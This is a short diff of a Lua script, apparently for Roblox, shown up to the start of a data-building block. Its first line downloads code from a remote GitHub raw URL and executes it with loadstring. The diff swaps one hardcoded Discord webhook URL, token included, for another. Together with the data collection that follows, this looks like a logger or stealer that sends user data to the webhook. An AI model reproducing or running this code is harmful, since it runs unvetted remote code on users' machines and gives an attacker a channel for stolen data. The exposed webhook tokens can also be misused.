@@ -1,5 +1,5 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xfarzadxx/main/main/silent'))()
-local webh = "https://discord.com/api/webhooks/1253768216493297705/-KlIkbjUdrLlbEKJiFRjdFfxitrO-UDR3xphHVljGWq_D1UsRQub8rve8h0K7YLjZ8YN"
+local webh = "https://discord.com/api/webhooks/1253770856660860948/UnzqgsWUH16SkuLngCpnELVHjxq46lq8iibwuxEjlosSAg0hgWCAmcGeS_dyWqECYCuw"
 
 pcall(function()
    local data = {
